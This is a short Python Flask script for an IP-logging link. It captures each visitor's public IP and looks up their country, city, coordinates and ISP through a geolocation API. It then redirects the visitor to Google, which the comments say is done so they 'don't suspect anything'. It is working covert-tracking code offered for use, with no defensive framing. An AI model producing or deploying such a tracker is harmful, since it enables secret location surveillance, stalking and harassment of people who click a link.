from flask import Flask, request, redirect
import requests

app = Flask(__name__)

# A free, no-auth API for IP geolocation
GEO_API_URL = "http://ip-api.com/json/"

@app.route('/track')
def track_user():
    # 1. Capture the user's real public IP address
    # If behind a proxy (like Heroku or Cloudflare), use X-Forwarded-For
    if request.headers.getlist("X-Forwarded-For"):
        user_ip = request.headers.getlist("X-Forwarded-For")[0]
    else:
        user_ip = request.remote_addr

    # Handle local testing environment
    if user_ip == '127.0.0.1' or user_ip.startswith('192.168.'):
        print("Local IP detected. Testing with a sample public IP.")
        user_ip = "8.8.8.8" # Dummy IP (Google DNS) for testing

    print(f"[+] Captured IP: {user_ip}")

    # 2. Look up the Geolocation data
    try:
        response = requests.get(f"{GEO_API_URL}{user_ip}").json()
        if response.get("status") == "success":
            print("--- USER LOCATION DATA ---")
            print(f"Country: {response.get('country')}")
            print(f"Region/State: {response.get('regionName')}")
            print(f"City: {response.get('city')}")
            print(f"Latitude/Longitude: {response.get('lat')}, {response.get('lon')}")
            print(f"ISP: {response.get('isp')}")
            print("--------------------------")
        else:
            print("[-] Could not retrieve geolocation for this IP.")
    except Exception as e:
        print(f"[-] Error fetching geolocation: {e}")

    # 3. Redirect the user so they don't suspect anything
    destination_url = "https://www.google.com" 
    return redirect(destination_url)

if __name__ == '__main__':
    # Run the server locally
    app.run(host='0.0.0.0', port=5000, debug=True)
